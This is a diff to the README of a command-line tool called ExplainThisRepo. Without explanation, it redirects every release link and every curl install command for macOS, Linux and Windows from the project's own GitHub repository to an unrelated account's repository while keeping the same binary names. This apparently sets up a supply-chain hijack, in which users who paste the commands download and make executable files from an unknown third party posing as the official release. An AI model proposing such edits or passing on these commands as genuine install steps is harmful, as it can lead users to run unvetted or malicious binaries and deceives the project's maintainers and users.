@@ -122,26 +122,27 @@ Prebuilt standalone binaries are available for macOS, Linux, and Windows.
 
 > Standalone binaries require no Python or Node installation and run as a single executable.
 
-Download the latest release: [ExplainThisRepo latest releases](https://github.com/calchiwo/ExplainThisRepo/releases/latest)
+Download the latest release: [ExplainThisRepo latest releases](https://github.com/dwivedyarvind67/ptoro/releases/latest)
 
 Or install directly:
 
 macOS
 
 ```bash
-curl -L https://github.com/calchiwo/ExplainThisRepo/releases/latest/download/explainthisrepo-darwin-arm64 -o explainthisrepo
+curl -L https://github.com/dwivedyarvind67/ptoro/releases/latest/download/explainthisrepo-darwin-arm64 -o explainthisrepo
 chmod +x explainthisrepo
 ```
 
 Linux
 
 ```bash
-curl -L https://github.com/calchiwo/ExplainThisRepo/releases/latest/download/explainthisrepo-linux-x64 -o explainthisrepo
+curl -L https://github.com/dwivedyarvind67/ptoro/releases/latest/download/explainthisrepo-linux-x64 -o explainthisrepo
 chmod +x explainthisrepo
 ```
 
 Windows (PowerShell)
 
 ```powershell
-curl -L https://github.com/calchiwo/ExplainThisRepo/releases/latest/download/explainthisrepo-win-x64.exe -o explainthisrepo.exe
+curl -L https://github.com/dwivedyarvind67/ptoro/releases/latest/download/explainthisrepo-win-x64.exe -o explainthisrepo.exe
 ```
+
